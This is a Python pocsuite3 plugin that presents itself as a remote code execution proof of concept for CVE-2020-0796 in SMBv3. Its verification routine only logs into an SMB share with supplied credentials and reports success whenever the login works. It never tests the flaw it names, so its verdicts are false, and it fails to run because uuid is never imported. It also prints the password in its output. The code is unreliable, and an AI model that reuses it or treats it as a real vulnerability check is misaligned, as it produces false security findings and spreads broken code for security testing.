from pocsuite3.api import POCBase, Output, register_poc, OptString
from smbprotocol.connection import Connection
from smbprotocol.session import Session
import sys

class CVE_2020_0796_PoC(POCBase):
    vulID = 'CVE-2020-0796'
    version = '1.0'
    author = ['Your Name']
    vulDate = '2020-03-10'
    createDate = '2023-07-24'
    updateDate = '2023-07-24'
    references = ['https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796']
    name = 'CVE-2020-0796 SMBv3 RCE'
    appPowerLink = 'https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smb'
    appName = 'SMBv3'
    appVersion = '3.1.1'
    vulType = 'Remote Code Execution'
    desc = 'This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of SMBv3.'
    
    def _options(self):
        o = {
            "servername": OptString("", description="The target server name or IP address"),
            "username": OptString("fakeusername", description="Username for SMB session"),
            "password": OptString("password", description="Password for SMB session")
        }
        return o

    def _verify(self):
        result = {}
        servername = self.get_option("servername")
        username = self.get_option("username")
        password = self.get_option("password")
        
        if not servername:
            return self.parse_output(result)

        try:
            connection = Connection(uuid.uuid4(), servername)
            connection.connect()
            session = Session(connection, username, password)
            session.connect()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Server'] = servername
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            return self.parse_output(result)
        except Exception as e:
            result['Error'] = str(e)
            return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('No response from target or unable to establish SMB session')
        return output

register_poc(CVE_2020_0796_PoC)

